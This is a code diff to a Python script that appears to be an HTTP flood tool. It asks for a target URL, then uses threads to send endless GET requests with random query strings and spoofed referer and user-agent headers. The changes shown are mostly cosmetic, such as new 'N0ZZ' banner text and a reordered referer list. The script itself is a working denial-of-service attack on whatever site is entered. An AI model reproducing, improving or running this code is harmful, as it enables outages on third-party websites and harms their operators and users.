@@ -32,17 +32,16 @@ faded_text = fade.fire(logo)
 print(faded_text)
 ask = fade.pinkred("\033[33m⟩⟩URL Target:\033[31m ✓✓ \033[0m")
 url = input(ask)
-
-count = 0
+u = int(0)
 headers = []
 referer = [
+    "https://github.com/",
     "https://google.it/",
-    "https://google.com/",
-    "https://alibaba.com/",    
-    "https://x.com/",
     "https://facebook.com/",
-]
-
+    "https://alibaba.com/",
+    "https://google.com/",
+    "https://youtube.com",
+    ]
 
 def useragent():
     global headers
@@ -75,13 +74,13 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print("[⟨⟩]\033[36m ▒\033[31m " +str(u)+ "▒ \033[37mRequest Sent ▒ \033[34m " +url+ "▒=⟩ \033[0m" )  
-                print("[⟨⟩]\033[31m▒ \033[32m " +str(u)+ " ▒\033[37mRequest Send\033[93m▒\033[34m " +url+ "▒\033[0m" )      
+                print("[*]  \033[31mN0ZZ --> \033[31m " +str(u)+ "   \033[37mSend the packet  \033[34m " +url+ "\033[0m" )  
+                print("[*]  \033[31mN0ZZ --> \033[31m " +str(u)+ "   \033[37mSend the packet  \033[34m " +url+ "\033[0m" )      
             except requests.exceptions.ConnectionError:
-                print("▒ ▒ ▒\033[1mServer \033[4mMaybe\033[97m ▒ ▒ ▒ \033[35mDown ▒ ▒ \033[0m" )
+                print("[*]  \033[1mN0ZZ --> \033[1m " +str(u)+ "   \033[97mSend the packet  \033[35m " +url+ "\033[0m" )
                 pass
             except requests.exceptions.InvalidSchema:
-                print ("[Finally attack]")
+                print ("[URL Error]")
                 raise SystemExit()
             except ValueError:
                 print ("[Check Your URL]")
